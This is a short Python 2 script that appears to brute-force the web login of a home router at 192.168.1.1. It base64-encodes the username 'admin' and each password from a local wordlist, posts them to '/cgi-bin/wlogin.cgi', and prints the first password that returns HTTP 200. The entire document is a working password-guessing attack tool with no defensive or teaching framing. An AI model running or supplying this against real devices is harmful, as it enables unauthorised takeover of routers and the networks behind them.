#! /usr/bin/python

import base64
import urllib
import httplib
import sys
import re
import time

def submitForm(login, password, host, path):
	values = {
			'aa' : login,
			'ab' : password
			}
	data = urllib.urlencode(values)
	headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
	conn = httplib.HTTPConnection(url)
	conn.request("POST", path, data, headers)
	response = conn.getresponse()
	conn.close()
	return True if response.status == 200 else False

def countLine(file):
	i = 0
	f = open(file, 'r')
	for l in f:
		i += 1;
	return i;

login = base64.b64encode('admin')
url = '192.168.1.1'
path = '/cgi-bin/wlogin.cgi'
fileName = 'passwd' 
f = open(fileName,'r')

print 'Scanning list of passwords.'
i = 0
total = countLine(fileName)
for l in f:
	passwordClean = re.sub(r'[^\w]', '', l)
	print('Total : ' + str(i) + '/' + str(total) + '           \r'),
	sys.stdout.flush()
	password = base64.b64encode(passwordClean)
	result = submitForm(login, password, url, path)
	if result:
		print passwordClean
		sys.exit(0)
	time.sleep(0.1)
	i += 1
